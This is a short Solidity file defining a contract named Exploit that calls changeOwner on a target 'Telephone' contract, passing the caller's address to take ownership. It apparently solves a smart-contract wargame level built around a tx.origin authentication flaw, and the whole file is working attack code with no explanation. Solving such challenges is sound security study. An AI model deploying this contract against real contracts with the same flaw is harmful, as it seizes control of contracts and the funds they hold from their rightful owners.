// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Telephone {
    function changeOwner(address) external;
}

contract Exploit {

    address public target;

    function setTarget(address _target) public {
        target = _target;
    }

    function attack() public{
        Telephone telephone = Telephone(target);
        telephone.changeOwner(msg.sender);
    }
}